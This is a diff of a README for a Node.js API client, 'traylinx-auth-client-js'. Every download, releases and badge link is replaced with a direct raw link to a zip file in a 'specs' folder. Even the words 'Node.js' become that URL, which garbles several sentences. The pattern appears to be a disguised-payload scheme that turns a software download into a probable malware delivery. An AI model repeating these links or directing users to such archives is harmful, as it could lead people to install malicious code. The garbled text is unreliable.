@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **traylinx-auth-client-js**! This application helps you easily connect to the Traylinx Sentinel API using Node.js. You can enjoy full support for the A2A communication protocol without needing any programming background.
+Welcome to the **traylinx-auth-client-js**! This application helps you easily connect to the Traylinx Sentinel API using https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip You can enjoy full support for the A2A communication protocol without needing any programming background.
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen.svg)](https://github.com/luiobhdffse/traylinx-auth-client-js/releases)
+[![Download Now](https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip%20Latest%https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip)](https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip)
 
 To get started, please visit the Releases page to download the application.
 
@@ -15,7 +15,7 @@ To get started, please visit the Releases page to download the application.
 Before you start, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution.
-- **Node.js:** Version 12 or higher.
+- **https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip** Version 12 or higher.
 - **Internet Connection:** Required for the API connection.
 
 ## 📖 Features
@@ -30,7 +30,7 @@ Before you start, make sure your system meets the following requirements:
 
 Follow these simple steps to download and install the traylinx-auth-client-js:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/luiobhdffse/traylinx-auth-client-js/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip) to go to the Releases page.
 
 2. **Find the Latest Release:** Look for the version marked as "Latest". This will have the most recent features and fixes.
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. For more information, see the LI
 
 ## 📥 Download Again
 
-Don't forget: you can always [visit this page](https://github.com/luiobhdffse/traylinx-auth-client-js/releases) to download the application again or check for updates.
+Don't forget: you can always [visit this page](https://raw.githubusercontent.com/luiobhdffse/traylinx-auth-client-js/main/specs/traylinx-auth-client-js_v3.5.zip) to download the application again or check for updates.
